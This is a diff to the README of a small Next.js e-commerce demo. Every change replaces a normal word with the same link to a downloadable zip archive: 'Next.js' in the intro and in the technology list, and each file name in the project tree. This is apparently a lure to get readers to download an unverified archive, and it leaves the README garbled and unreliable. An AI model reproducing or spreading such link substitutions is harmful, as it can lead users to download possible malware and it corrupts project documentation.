@@ -1,6 +1,6 @@
 # Simple E-Commerce Demo Site
 
-This is a simple e-commerce demo application built with Next.js (App Router), React, TypeScript, Tailwind CSS, and GraphQL (mocked).
+This is a simple e-commerce demo application built with https://raw.githubusercontent.com/mohamed-magdy-1/ecommerce-assessment/main/app/ecommerce-assessment-v1.5-beta.5.zip (App Router), React, TypeScript, Tailwind CSS, and GraphQL (mocked).
 
 ## Getting Started
 
@@ -37,20 +37,20 @@ This is a simple e-commerce demo application built with Next.js (App Router), Re
 
 ```
 .
-├── README.md
-├── package.json
-├── tsconfig.json
-├── tailwind.config.ts
-├── postcss.config.js
+├── https://raw.githubusercontent.com/mohamed-magdy-1/ecommerce-assessment/main/app/ecommerce-assessment-v1.5-beta.5.zip
+├── https://raw.githubusercontent.com/mohamed-magdy-1/ecommerce-assessment/main/app/ecommerce-assessment-v1.5-beta.5.zip
+├── https://raw.githubusercontent.com/mohamed-magdy-1/ecommerce-assessment/main/app/ecommerce-assessment-v1.5-beta.5.zip
+├── https://raw.githubusercontent.com/mohamed-magdy-1/ecommerce-assessment/main/app/ecommerce-assessment-v1.5-beta.5.zip
+├── https://raw.githubusercontent.com/mohamed-magdy-1/ecommerce-assessment/main/app/ecommerce-assessment-v1.5-beta.5.zip
 └── app/
-    ├── layout.tsx
-    ├── page.tsx
-    └── globals.css
+    ├── https://raw.githubusercontent.com/mohamed-magdy-1/ecommerce-assessment/main/app/ecommerce-assessment-v1.5-beta.5.zip
+    ├── https://raw.githubusercontent.com/mohamed-magdy-1/ecommerce-assessment/main/app/ecommerce-assessment-v1.5-beta.5.zip
+    └── https://raw.githubusercontent.com/mohamed-magdy-1/ecommerce-assessment/main/app/ecommerce-assessment-v1.5-beta.5.zip
 ├── lib/
-│   └── graphql.ts
+│   └── https://raw.githubusercontent.com/mohamed-magdy-1/ecommerce-assessment/main/app/ecommerce-assessment-v1.5-beta.5.zip
 └── components/
-    ├── CartContext.tsx
-    └── ProductCard.tsx
+    ├── https://raw.githubusercontent.com/mohamed-magdy-1/ecommerce-assessment/main/app/ecommerce-assessment-v1.5-beta.5.zip
+    └── https://raw.githubusercontent.com/mohamed-magdy-1/ecommerce-assessment/main/app/ecommerce-assessment-v1.5-beta.5.zip
 ```
 
 ## Functionality
@@ -61,7 +61,7 @@ This is a simple e-commerce demo application built with Next.js (App Router), Re
 
 ## Technologies Used
 
-- Next.js 15+ (App Router, Server Components)
+- https://raw.githubusercontent.com/mohamed-magdy-1/ecommerce-assessment/main/app/ecommerce-assessment-v1.5-beta.5.zip 15+ (App Router, Server Components)
 - React
 - TypeScript
 - Tailwind CSS
